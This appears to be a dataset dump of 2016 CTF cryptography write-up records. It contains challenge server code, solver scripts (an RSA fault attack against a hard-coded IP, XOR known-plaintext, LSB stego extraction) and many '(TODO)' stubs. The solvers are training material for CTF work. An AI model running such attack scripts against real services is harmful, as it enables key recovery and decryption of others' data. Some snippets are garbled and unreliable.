_sage_const_1025 = Integer(1025); _sage_const_97 = Integer(97); _sage_const_300 = Integer(300)\nfrom sparrowCTF import *\nfrom z3 import *\n\ndef pos(g, orig_s, err_s, N):\n    r = list(range(_sage_const_1025 ))\n    for x in r:\n        if (err_s * pow(g, _sage_const_2 **x, N)) % N == orig_s:\n            r.remove(x)\n            return x, _sage_const_1 \n        elif (orig_s * pow(g, _sage_const_2 **x, N)) % N == err_s:\n            r.remove(x)\n            return x, _sage_const_0 \n\ndef rotate(req):\n    req.recv_until(\":\")\n    req.sendline(\"yes\")\n    req.recv_until(\":\")\n\ndef NnS():\n    r = Remote(\"192.241.234.35\", 31337 , debug=False)\n    r.sendline(\"3\")\n    #get N\n    N = r.recvline()[:-_sage_const_1 ].split(':')[-_sage_const_1 ]\n    rotate(r)\n    r.sendline(\"3\")\n    #get orig_s\n    ss = list()\n    while len(ss) == len(set(ss)):\n        rotate(r)\n        r.sendline(\"3\")\n        orig_s = r.recvline().split(',')[_sage_const_0 ].split(':')[-_sage_const_1 ]\n        ss.append(orig_s)\n\n    return int(N), int(orig_s)\n\ndef solve():\n    N, orig_s = NnS()\n    e = _sage_const_0x10001 \n    g = _sage_const_3 \n    r = Remote(\"192.241.234.35\", 31337 , debug=False)\n    res = _sage_const_0 \n    bits = _sage_const_300 \n    while bits > _sage_const_0 :\n        r.sendline(\"3\")\n        sig = int(r.recvline().split(',')[_sage_const_0 ].split(':')[-_sage_const_1 ])\n        rotate(r)\n\n        if sig == orig_s:\n            continue\n        p, b = pos(g, orig_s, sig, N)\n        res += (_sage_const_2 **p) * b\n        bits -= _sage_const_1 \n        print \"[+] {0} bits left to map...\\n[+] current d:{1}\".format(bits, res)\n\n    return res, N\n\ndef recover(partial_d, N, e):\n    # ed' = 1 + k(N - s + 1) mod n'\n    # (k*(qq**2) + (e*d - k*(N+1) - 1)*qq + k*N) % 2**300 == 0\n    dd = partial_d\n    k = _sage_const_0 \n\n    while k < e:\n        print \"[+]Testing %d\" % k\n        print solve_mod([(k*(x**_sage_const_2 ) + (e*dd - k*(N+_sage_const_1 ) - _sage_const_1 )*x + k*N) == _sage_const_0 ], _sage_const_2 **_sage_const_300 )\n        k += _sage_const_1 \n\n    #when k == 57 got the correct p' which can to be used to factor N by coppersmith.\n    #too lazy to implement it here :P\n    \ndef main():\n    res, N = solve()\n    e = _sage_const_97 \n    recover(res, N, e)\n\nif __name__ == \"__main__\":\n    main()\n\n# still_broken_box.py\nfrom functools import wraps\nimport errno\nimport os\nimport signal\nimport SocketServer\nimport random, time\n\nclass TimeoutError(Exception):\n    pass\n\ndef timeout(seconds=10, error_message=os.strerror(errno.ETIME)):\n    def decorator(func):\n        def _handle_timeout(signum, frame):\n            raise TimeoutError(error_message)\n\n        def wrapper(*args, **kwargs):\n            signal.signal(signal.SIGALRM, _handle_timeout)\n            signal.alarm(seconds)\n            try:\n                result = func(*args, **kwargs)\n            finally:\n                signal.alarm(0)\n            return result\n\n        return wraps(func)(wrapper)\n\n    return decorator\n\n@timeout(60)\ndef recv(req, bytes):\n        return req.recv(bytes)\n\ndef sign(req):\n    d = 72596297030027247088224441953116786228228821869766428209408803933205537023998505397353083159853232071634218962765810199687928871114871071437224958879899194322315727105732530760408149352537661939990489463013528377200061436727961572916826684795534376097377874541448076152549360494498557470018458506007946440429\n    N = 123541066875660402939610015253549618669091153006444623444081648798612931426804474097249983622908131771026653322601466480170685973651622700515979315988600405563682920330486664845273165214922371767569956347920192959023447480720231820595590003596802409832935911909527048717061219934819426128006895966231433690709\n    bits = list(range(0, 300))\n    random.shuffle(bits)\n    while True:\n        req.sendall(\"Input an number(0~9999) to be signed:\")\n        msg = recv(req, 5)\n        try:\n            g = int(msg)\n            if g < 0 or g > 9999:\n                raise Exception\n        except:\n            req.sendall(\"Wrong input, quitting...\")\n            return\n            \n        if random.random() < 0.5:\n            if len(bits) == 0:\n                req.sendall(\"Box is overheating, quitting...\")\n                return\n            pos = bits.pop()\n            enc = pow(g, d^(2**pos), N)\n        else:\n            enc = pow(g, d, N)\n        req.sendall(\"signature:{0}, N:{1}\".format(str(enc), N))\n        req.sendall(\"\\nSign more items?(yes, no):\")\n        choice = recv(req, 4).split('\\n')[0]\n        if choice == 'no':\n            break\n\nclass incoming(SocketServer.BaseRequestHandler):\n    def handle(self):\n        random.seed(time.time())\n        req = self.request\n        sign(req)\n\nclass ReusableTCPServer(SocketServer.ForkingMixIn, SocketServer.TCPServer):\n    pass\n\nSocketServer.TCPServer.allow_reuse_address = True\nserver = ReusableTCPServer((\"0.0.0.0\", 8000), incoming)\nserver.timeout = 60\nserver.serve_forever()\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\ctfx-2016\\crypto\\blocky-1", "year": "2016", "name": "blocky-1", "writeup": "# CTFx : blocky-1\n\n**Category:** Crypto\n**Points:** 1\n**Solves:** \n**Description:**\n\n> I decided to invent my own encryption algorithm and encrypted the flag with it! I doubt you'll get it.\n> \n> \n> 6915c70109fa3398321127cfcd44342115d6d75feb56706087\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/bobacadodl/ctfx-problems/tree/master/crypto/blocky-200\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\ctfx-2016\\crypto\\customauth-100", "year": "2016", "name": "customauth-100", "writeup": "# CTFx : customauth-100\n\n**Category:** Crypto\n**Points:** 100\n**Solves:** \n**Description:**\n\n> I learned about cryptography and tried implementing my own authentication. I doubt you can bypass it...\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://nandynarwhals.org/2016/08/29/ctfx-2016-custom-auth-crypto/\n* https://github.com/bobacadodl/ctfx-problems/blob/master/crypto/customauth-100/writeup.txt\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\ctfx-2016\\crypto\\lambda-50", "year": "2016", "name": "lambda-50", "writeup": "# CTFx : lambda-50\n\n**Category:** Crypto\n**Points:** 50\n**Solves:** \n**Description:**\n\n> I used this program to encrypt a flag. The output was: \n> \n> n1s4_t1An(f1ctdb@mpl_h3)m3lp3y__Eas\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/phamhuudanh96/CTF_WriteUp/blob/master/ctfx_2016_lambda.py\n* [RawSec](https://rawsec.ml/en/CTFx-50-lambda-cryptography/\n* https://github.com/73696e65/ctf-notes/blob/master/2016-ctfx/Cryptography-50-%CE%BB.txt\n* https://github.com/bobacadodl/ctfx-problems/blob/master/crypto/lambda-50/writeup.txt\n* https://leictf.blogspot.in/2016/08/write-upctfx-crypto50-lambda.html\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\ctfx-2016\\crypto\\little-crypto-gambler-150", "year": "2016", "name": "little-crypto-gambler-150", "writeup": "# CTFx : little-crypto-gambler-150\n\n**Category:** Crypto\n**Points:** 150\n**Solves:** \n**Description:**\n\n> I created this gambling game. Can you win?\n> \n> \n> nc problems.ctfx.io 7000\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/bobacadodl/ctfx-problems/tree/master/crypto/little_crypto_gambler-150\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\cyber-security-challenge-belgium-2016-qualifiers\\Cryptography\\BSOD-quote", "year": "2016", "name": "BSOD-quote", "writeup": "# Cyber Security Challenge 2016: BSOD Quote\n\n**Category:** Cryptography  \n**Points:** 15  \n**Challenge designer:** Nico Callens  \n**Description:**  \n> Find the flag in [this file](https://s3-eu-west-1.amazonaws.com/be.cscbe.challenges/Cryptography+-+BSOD+quote+-+Nico+Callens/BSOD.scr).  \n> The solution is enclosed between quotes.\n\n## Write-up\nA .src (screensaver) file can be unzipped which will return all of the images used in the screensaver.\n```\n$ unzip BSOD.src\n```\n\nOpen GIMP, File -> Open as Layers, select all the screensaver images\n\n![start](images/start.png)\n\nSelect Tools -> Paint Tools -> Bucket Fill and set the Mode to Color erase.\nNow for each of the layers click on the blue background. All of the letters will show and the solution will be visible.\n\n![solution](images/solution.png)\n\n## Other write-ups and resources\n\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\cyber-security-challenge-belgium-2016-qualifiers\\Cryptography\\In-a-jiffy", "year": "2016", "name": "In-a-jiffy", "writeup": "# Cyber Security Challenge 2016: In a jiffy\n\n**Category:** Cryptography  \n**Points:** 25  \n**Challenge designer:** Michiel Meersmans  \n**Description:**  \n> Someone used this [NSA-approved-backdoor-free encryption program](challenge-source-files/encrypt.py) to encrypt the following [file](challenge-source-files/flag_800x400.gif.enc). Can you decrypt the file and prove itâ€™s not so secure after all?  \n\n**Hints:**\n> \\#1: <https://www.youtube.com/watch?v=9iafa959JvY>  \n> \\#2: What's in a name?\n\n## Write-up\nWe start off by taking a look at the script used for encrypting the file.\nThe script starts off by generating a random 10 byte key and expands the key to the size of the file that needs to be encrypted by repeating it multiple times.\nThis expanded key is than used in a simple XOR encryption.\n\nXOR encryptions have the property that if we XOR the ciphertext with the plaintext weâ€™ll get the key. Looking at the file name of the encrypted file it contains â€œ.gifâ€ so itâ€™s pretty safe to assume itâ€™s a GIF image.\n\nPerforming a bit more research on the gif format:\n<http://giflib.sourceforge.net/whatsinagif/bits_and_bytes.html>\n<https://en.wikipedia.org/wiki/GIF#Example_GIF_file>\n\nWe learn that a GIF file always starts with a fixed 6 byte header, followed by 2 bytes of width and 2 bytes of height. The width and height are both in the filename too, so now we know the first 10 bytes of the plaintext file. We can XOR these bytes with the encrypted file to figure out the key and decrypt the entire image. The following python script does just that:\n\n```\n$ python solve.py\n```\n\n![flag](images/solution.png)\n\n", "solution_code": "\n# solve.py\n# Gif file specification:\n# http://giflib.sourceforge.net/whatsinagif/bits_and_bytes.html\n# https://en.wikipedia.org/wiki/GIF#Example_GIF_file\n\n# Looking at the structure of a GIF file we learn that the first 6 bytes of a GIF file are GIF87a or GIF89a \n# followed by 2 bytes indicating the width and 2 bytes indicating the height of the file.\n\n# The flag file name hints that it is a 800 by 600 pixel image. Because of this we know the first 10 bytes and can derive the key used to encrypt the file\n\nimport struct\n\ndef expand_key(key, length):\n\treturn (length / len(key)) * key + key[0:(length % len(key))]\n\ndef xor(s1, s2):\n\tassert len(s1) == len(s2)\n\treturn ''.join([chr(ord(a) ^ ord(b)) for a,b in zip(s1, s2)])\n\n\nf = open('flag_800x400px.gif.enc')\nenc = f.read()\nf.close()\n\n# We derive the two possible keys depending on the GIF version used\n\nheader = \"GIF87a\" + struct.pack(\"HH\", 800, 400)\nkey1 = xor(header, enc[0:10])\nkey1 = expand_key(key1, len(enc))\n\nheader = \"GIF89a\" + struct.pack(\"HH\", 800, 400)\nkey2 = xor(header, enc[0:10])\nkey2 = expand_key(key2, len(enc))\n\nopen(\"gif87.gif\", \"w\").write( xor(key1, enc) )\nopen(\"gif89.gif\", \"w\").write( xor(key2, enc) )"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\cyber-security-challenge-belgium-2016-qualifiers\\Cryptography\\In-a-jiffy\\challenge-source-files", "year": "2016", "name": "challenge-source-files", "solution_code": "\n# encrypt.py\nimport os\nimport sys\n\nKEY_SIZE = 10\n\ndef expand_key(key, length):\n\treturn (length / len(key)) * key + key[0:(length % len(key))]\n\ndef xor(s1, s2):\n\tassert len(s1) == len(s2)\n\treturn ''.join([chr(ord(a) ^ ord(b)) for a,b in zip(s1, s2)])\n\ndef main():\n\tif len(sys.argv) == 2:\n\t\tkey = os.urandom(KEY_SIZE)\n\n\t\tfilename = sys.argv[1]\n\n\t\tf = open(filename)\n\t\tdata = f.read()\n\t\tf.close()\n\n\t\texpanded_key = expand_key(key, len(data))\n\t\tdata_encrypted = xor(expanded_key, data)\n\n\t\tf = open(filename + \".enc\", \"w\")\n\t\tf.write(data_encrypted)\n\t\tf.close()\n\t\t\n\t\tprint \"File %s encrypted with key: %s\" % (filename, key.encode(\"hex\"))\n\telse:\n\t\tprint \"Usage: %s <filename>\" % (sys.argv[0])\n\nif __name__ == \"__main__\":\n\tmain()"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\cyber-security-challenge-belgium-2016-qualifiers\\Cryptography\\This-looks-random", "year": "2016", "name": "This-looks-random", "writeup": "# Cyber Security Challenge 2016: This looks random\n\n**Category:** Cryptography  \n**Points:** 40  \n**Challenge designer:** Daan Raman  \n**Description:**  \n> There is no way you are solving this challenge - itâ€™s generating random strings of text!\n\n> Note: donâ€™t reverse the executable unless you like pain.  \n\n> The solution is a 9 letter Italian word, all lower case.  \n> [The executable](challenge-source-files/you_move_me) is non-harmful and can be run on a UNIX system (compiled on Kali).  \n\n**Hints:**\n> Perform a statistical analysis of each line printed, and see if you find a pattern.\n\n## Write-up\nIf you run the program, it will print out apparently random strings, however, there is a statistical bias in the strings, on the letter A. Their frequency of appearance is linked to the fibonacci sequence.  \nThe challenge is in some way â€œsolving itselfâ€ - it creates random strings until it has found one that matches the number of â€œAâ€ characters identical to the Fibonacci number at that position in the sequence - so statistically less Aâ€™s in the first sentences printed, and more Aâ€™s in the later sentences printed. The longer you wait, the clearer the statistical bias will become.\n\n```python\nimport random, string\nimport collections\n\ndef randomword(length):\n   return ''.join(random.choice(string.lowercase) for i in range(length))\n\narr=[0, 51, 1, 62, 1, 89, 2, 66, 3, 100, 5, 289, 8, 192, 13, 223, 21, 22, 34, 10, 55, 4, 89]\nc=0\nsearch_char = \"a\"\n\nwhile len(arr) > 0:\n   c=c+1\n   print str(c) + \"\\r\",\n   numbers_char_matched = 0\n   stri =  randomword(160)\n   str_count = stri.count(search_char)\n\n   if str_count == arr[0]:\n\tprint str(stri)\n\tarr.pop(0)\n\tarr.pop(0)\n\n```\n\nIf you count the frequency of 'a' in each string you'll notice the fibonacci sequence\n\n```python\n>>> import collections\n>>> letters = collections.Counter('string')\n```\n\n![solution](images/solution.png)\n\n### Solution\nfibonachi\n\n*Note: fibonacci sequence = 0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, ...  \nThe string length is only 160 characters which means the frequency of a can only appear 160 times. So after 12 printed strings, the program should stop.*\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\cyber-security-challenge-belgium-2016-qualifiers\\Cryptography\\What-did-he-say", "year": "2016", "name": "What-did-he-say", "writeup": "# Cyber Security Challenge 2016: What did he say?\n\n**Category:** Cryptography  \n**Points:** 20  \n**Challenge designer:** Sasja Reynaert  \n**Description:**  \n> Somebody found a high point challenge and tweeted about it, he even gives away a hint!  \n[https://twitter.com/HereIsJ0hnny](https://twitter.com/HereIsJ0hnny)  \n\n**Hints:**\n> Homoglyph\n\n## Write-up\nA Google search for `\"twitter homoglyph decode\"` points to <http://holloway.co.nz/steg/>. Decoding the [tweet](https://twitter.com/HereIsJ0hnny/status/694255760402976768) text using that tool yields the solution.\n\n![solution.png](images/solution.png)\n\n### Solution\nbazinga\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\cyber-security-challenge-belgium-2016-qualifiers\\Cryptography\\Wheres-waldo", "year": "2016", "name": "Wheres-waldo", "writeup": "# Cyber Security Challenge 2016: Where's Waldo?\n\n**Category:** Cryptography  \n**Points:** 40  \n**Challenge designer:** CÃ©dric Bassem  \n**Description:**  \n> Waldo has really outdone himself this time! [Can you find him?](challenge-source-files/whereswaldo.bpm)  \n\n**Hints:**\n> Waldo is well hidden within the image\n\n## Write-up\nWaldo is hidden within the above image by using an image steganography technique called LSB steganography. With least significant bits steganography (LSB), data is hidden within an image by altering the least significant bit of each byte. For a BMP file using a 24 bit color representation, each color is represented by three bytes, one for every base color in RGB. Changes in the LSB of every byte have minimal impact on the color and are indiscernible to the human eye.  \n\nOne way of detecting LSB steganography is by enhancing the LSB values of that image. The below image shows an LSB enhancement of the above image. We notice the following odd pattern. \n\n![screenshot](images/ss.png)\n\nExtracting the information is performed by extracting every LSB value from every color.  \nThe below python code does this. \n\n```python\nfrom PIL import Image  \n  \nim = Image.open(\"encoded.bmp\")  \npix = im.load()  \nwidth, height = im.size  \n  \nextracted_bits = []  \nfor y in range(height):  \n    for x in range(width):  \n\t        r, g, b = pix[(x,y)]  \n\t        extracted_bits.append(r & 1)  \n\t        extracted_bits.append(g & 1)  \n\t        extracted_bits.append(b & 1)  \n\t  \n\textracted_byte_bits = [extracted_bits[i:i+8] for i in range(0, len(extracted_bits), 8)]  \n\twith open(\"secret.bmp\", \"wb\") as out:  \n\t    for byte_bits in extracted_byte_bits:  \n\t                byte_str = ''.join(str(x) for x in byte_bits)  \n\t        byte = chr(int(byte_str, 2))  \n\t        out.write(byte)\n```\n\nIn this case the hidden message was a BMP image\n\n![onedoessimplynot](images/extracted.bmp)\n\nWhich contained another LSB hidden image. With FLAG: UHcUbUz5omz5lZKS4pzr\n\n![flag](images/extracted2.bmp)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\cyber-security-challenge-belgium-2016-qualifiers\\Cryptography\\Wheres-waldo\\challenge-source-files", "year": "2016", "name": "challenge-source-files", "solution_code": "\n# extract.py\nfrom PIL import Image\n\nim = Image.open(\"extracted.bmp\")\npix = im.load()\nwidth, height = im.size\n\nextracted_bits = []\nfor y in range(height):\n\tfor x in range(width):\n\t\tr, g, b = pix[(x,y)]\n\t\textracted_bits.append(r & 1)\n\t\textracted_bits.append(g & 1)\n\t\textracted_bits.append(b & 1)\n\nextracted_byte_bits = [extracted_bits[i:i+8] for i in range(0, len(extracted_bits), 8)]\nwith open(\"extracted2.bmp\", \"wb\") as out:\n\tfor byte_bits in extracted_byte_bits:\n                byte_str = ''.join(str(x) for x in byte_bits)\n\t\tbyte = chr(int(byte_str, 2))\n\t\tout.write(byte)\n\n\n\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\ectf-2016\\crypto\\counterattack", "year": "2016", "name": "counterattack", "writeup": "# ECTF 2016 | counterattack\n\n**Category** crypto\n**Points** 100\n**Solves** 9\n**Description:**\n> This dude thinks he's hot at crypto, but he's really not. Don't you SEA[::-1]?! Hosted at: 35.161.87.33:5968\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet", "solution_code": "\n# counterattack.py\nfrom Crypto.Cipher import AES\nimport threading\nimport socket\nimport sys\nimport os\n\n\nclass ClientThread(threading.Thread):\n\n    def __init__(self,ip,port,socket):\n        threading.Thread.__init__(self)\n        self.ip = ip\n        self.port = port\n        self.socket = socket\n        self.flag = \"xxxxx\"\n        self.count = -1\n        print \"[+] New thread started for \"+ip+\":\"+str(port)\n\n    def makeBlocks(self, data):\n        return [data[i:i+16] for i in range(0, len(data), 16)]\n\n    def encrypt(self, plain, IV, key):\n        self.count += 1\n        CTR = bin((self.count) % 16)[2:].zfill(4)\n        feed = IV + CTR\n        cipher = AES.new(key, AES.MODE_ECB)\n        keystream = cipher.encrypt(feed)\n        return self.xor(keystream, plain)\n\n    def xor(self, keystream, data):\n        out = []\n        for idx, ch in enumerate(data):\n            out.append(chr(ord(ch) ^ ord(keystream[idx % 16])))\n        return ''.join(out)\n\n    def run(self):\n        print \"Connection from : \"+ip+\":\"+str(port)\n        key = os.urandom(16)\n        IV = os.urandom(12)\n        outputBuffer = []\n        blocks = self.makeBlocks(self.flag)\n        for block in blocks:\n            outputBuffer.append(self.encrypt(block, IV, key))\n\n        while True:\n            data = self.socket.recv(1024).strip('\\n')\n            if data == \"stop\":\n                self.socket.send(str(outputBuffer) + \"\\n\")\n                self.socket.close()\n                sys.exit(0)\n            if len(data) % 16 != 0:\n                self.socket.send(\"Invalid: {0}\".format(data) + \"\\n\")\n                continue\n            blocks = self.makeBlocks(data)\n            for block in blocks:\n                outputBuffer.append(self.encrypt(data, IV, key))\n\n        print \"Client disconnected...\"\n       \tself.socket.close()\n\nhost = \"0.0.0.0\"\nport = 5968\n\ntcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ntcpsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n\ntcpsock.bind((host,port))\nthreads = []\n\nwhile True:\n    tcpsock.listen(4)\n    print \"\\nListening for incoming connections...\"\n    (clientsock, (ip, port)) = tcpsock.accept()\n\n    # Let's use a new thread for each incoming connection\n    newthread = ClientThread(ip, port, clientsock)\n    newthread.start()\n    threads.append(newthread)\n\nfor t in threads:\n    t.join()"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\ectf-2016\\crypto\\cryptofun", "year": "2016", "name": "cryptofun", "writeup": "# ECTF 2016 | cryptofun\n\n**Category** crypto\n**Points** 150\n**Solves** 11\n**Description:**\n> Try out the e3â„¢ beta storage service today! Hosted at: 35.161.87.33:9999\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet", "solution_code": "\n# cryptofun.py\nfrom utils import SECRET # Flag format ECTF{[a-z]{27}}\nimport utils\nimport threading\nimport socket\nimport sys\nimport os\nimport json\nimport yaml\n\nhost = \"0.0.0.0\"\nport = 9999\n\ntcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ntcpsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n\ntcpsock.bind((host,port))\nthreads = []\nclass ClientThread(threading.Thread):\n\n    def __init__(self,ip,port,socket):\n        threading.Thread.__init__(self)\n        self.ip = ip\n        self.port = port\n        self.socket = socket\n        self.msg = {}\n        self.msg[\"uniqueId\"] = ip\n        self.msg[\"SECRET\"] = SECRET\n        print \"[+] New thread started for \"+ip+\":\"+str(port)\n\n    def run(self):\n        try:\n            print \"Connection from : \"+self.ip+\":\"+str(self.port)\n            welcome = \"\"\"\nWelcome to e3 storage interface. This is a beta version so bare with us :)\nStorage costs are as cheap as Rs.1 per byte ;).\nNote:\n* The bytes used are calculated after zlib compression.\n* The storage used by the metadata is also charged\n\"\"\"\n            menu = \"\"\"\nChoose option\n1) Upload (Max of 1024 bytes)\n2) Download\n3) Exit\n\"\"\"\n            self.socket.send(welcome)\n            while True:\n                self.socket.send(menu)\n                option = self.socket.recv(5).strip()\n                if option == \"1\":\n                    self.socket.send(\"Input data..\\n\")\n                    data = self.socket.recv(1024).strip()\n                    self.msg[\"msg\"] = data\n                    data = json.dumps(self.msg)\n                    cost = utils.upload_data(data)\n                    self.socket.send(\"Cost:\" + str(cost) + \"\\n\")\n                elif option == \"2\":\n                    self.socket.send(\"Ooops. Download not implemented yet in beta version\\n\")\n                else:\n                    self.socket.send(\"Bye\\n\")\n                    self.socket.close()\n                    return\n        except Exception as e:\n            print e\n            return\n\n\nwhile True:\n    tcpsock.listen(4)\n    print \"\\nListening for incoming connections...\"\n    (clientsock, (ip, port)) = tcpsock.accept()\n\n    # Let's use a new thread for each incoming connection\n    newthread = ClientThread(ip, port, clientsock)\n    newthread.start()\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\ectf-2016\\crypto\\DaaS", "year": "2016", "name": "DaaS", "writeup": "# ECTF 2016 | DaaS\n\n**Category** crypto\n**Points** 50\n**Solves** 13\n**Description:**\n> Shawty set up a decryption service for his homies. Plz rek it. Hosted at: 35.161.87.33:18734\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-10-23-ectf/crypto_50)\n", "solution_code": "\n# DaaS.py\nimport Crypto\nfrom Crypto.PublicKey import RSA\nimport threading\nimport socket\nimport sys\nimport os\n\n# e = 8257e5269cc0cdb32271154d4f5df508380e27b8826798c7271a237ff9e4191cc047629cf9684703f4826df1c69a1cfe786841d191757515abfe1a09d8bef7d92b40c6b37377e3218b109cfa734802ec418c2e08468ffcf6c11a1314600fce6714fa10fb3d5ed4a7ca89d69dc66d1f34aa9acbc8830b3319d281e0defc393ecb\n# n = cd67fc599866f87bc45ff87c1634aa144ee257c963ab2541052f3b38d22a11b255b0dd9318153699664b1007b7f38118df77f703909888c3930b73221c57828fc423a643b1eaf47f03d6c24b11d907f979dae4aa47347959c7c77bda8f9804dd95cc438d75ced522c7391a5d1432978440bfacc9939a33d6e6e058b15a084f99\n\nclass ClientThread(threading.Thread):\n\n    def __init__(self,ip,port,socket):\n        threading.Thread.__init__(self)\n        self.ip = ip\n        self.port = port\n        self.socket = socket\n        self.keysFile = \"/home/challenge/keys.txt\"\n        self.encrypted_flag_file = \"/home/challenge/flag.encrypted\"\n        print \"[+] New thread started for \"+ip+\":\"+str(port)\n\n    def run(self):\n        print \"Connection from : \"+ip+\":\"+str(port)\n        original_ctext = open(self.encrypted_flag_file, 'r').readline()\n        self.socket.send(\"Enter cipher text for which you want the plaintext.\\n\")\n        ct = self.socket.recv(1024).strip()\n        print ct\n        if ct == original_ctext:\n            self.socket.send(\"Enter a different ciphertext!\\n\")\n        else:\n            parameters = open(self.keysFile, 'r').readlines()\n            for i in range(len(parameters)):\n                parameters[i] = int(parameters[i], 16)\n            parameter_tuple = tuple(parameters)\n            key = RSA.construct(parameter_tuple)\n            try:\n                decrypted = key.decrypt(ct.decode('hex'))\n                self.socket.send(\"Plaintext: %s\" % decrypted.encode('hex'))\n            except:\n                self.socket.send(\"Invalid\" + \"\\n\")\n                self.socket.close()\n\n        print \"Client disconnected...\"\n        self.socket.close()\n\nhost = \"0.0.0.0\"\nport = 18734\n\ntcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ntcpsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n\ntcpsock.bind((host,port))\nthreads = []\n\nwhile True:\n    tcpsock.listen(4)\n    print \"\\nListening for incoming connections...\"\n    (clientsock, (ip, port)) = tcpsock.accept()\n\n    # Let's use a new thread for each incoming connection\n    newthread = ClientThread(ip, port, clientsock)\n    newthread.start()\n    threads.append(newthread)\n\nfor t in threads:\n    t.join()"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\google-ctf-2016\\crypto", "year": "2016", "name": "crypto", "writeup": "# google-ctf-2016 : crypto\n\n**Category:** Crypto\n**Points:** \n**Solves:** \n**Description:**\n\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\google-ctf-2016\\crypto\\eucalypt-forest-100", "year": "2016", "name": "eucalypt-forest-100", "writeup": "# google-ctf-2016 : eucalypt-forest-100\n\n**Category:** Crypto\n**Points:** 100\n**Solves:** 111\n**Description:**\n\nCan you find any weaknesses in the use of the encryption keys?\n\nHead over to <eucalypt-forest.ctfcompetition.com>\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://ctftime.org/writeup/3269\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\google-ctf-2016\\crypto\\rich-man-300", "year": "2016", "name": "rich-man-300", "writeup": "# google-ctf-2016 : rich-man-300\n\n**Category:** Crypto\n**Points:** 300\n**Solves:** 2\n**Description:**\n\nCan you solve this? Running on ssl-added-and-removed-here.ctfcompetition.com:10981\n\nrich-man-stripped\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* <https://github.com/luc-lynx/richman/blob/master/README.md>\n"}
{"source": "write-ups-2016", "category": "RSA", "path": "data\\write-ups-2016\\google-ctf-2016\\crypto\\rsacalc-300", "year": "2016", "name": "rsacalc-300", "writeup": "# google-ctf-2016 : rsacalc-300\n\n**Category:** Crypto\n**Points:** 300\n**Solves:** 24\n**Description:**\n\nConnect to ssl-added-and-removed-here.ctfcompetition.com:59999\n\nTry our new Cloud Computing Service.\n\nNote: Encrypt and decrypt operations expect base64-encoded input.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://neg9.org/news/2016/5/4/google-ctf-2016-rsacalc-crypto-300-writeup\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\google-ctf-2016\\crypto\\spotted-wobbegong-100", "year": "2016", "name": "spotted-wobbegong-100", "writeup": "# google-ctf-2016 : spotted-wobbegong-100\n\n**Category:** Crypto\n**Points:** 100\n**Solves:** 15\n**Description:**\n\nAre you able to defeat 1024-bit RSA? <https://spotted-wobbegong.ctfcompetition.com/>\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://mslc.ctf.su/wp/google-ctf-spotted-wobbegong-crypto-100/\n* https://ctftime.org/writeup/3267\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\google-ctf-2016\\crypto\\wolf-spider-125", "year": "2016", "name": "wolf-spider-125", "writeup": "# google-ctf-2016 : wolf-spider-125\n\n**Category:** Crypto\n**Points:** 125\n**Solves:** 31\n**Description:**\n\nContinuing on from Eucalypt Forest - can you break Message Authentication in Wolf Spider <https://wolf-spider.ctfcompetition.com/>\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://thegoonies.rocks/google-ctf-wolf-spider-web/\n* http://mslc.ctf.su/wp/google-ctf-wolf-spider-crypto-125/\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\google-ctf-2016\\crypto\\woodman-100", "year": "2016", "name": "woodman-100", "writeup": "# google-ctf-2016 : woodman-100\n\n**Category:** Crypto\n**Points:** 100\n**Solves:** 57\n**Description:**\n\nHow honest are you?\n\nRunning here <https://giant-goannas.ctfcompetition.com/>\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://gist.github.com/kalloc/b848ba3beabb9d0e34902cd1be95d3b5\n* https://github.com/r00ta/myWriteUps/blob/master/GoogleCTF/woodman/README.md\n* http://mslc.ctf.su/wp/google-ctf-woodman-crypto-100/\n"}
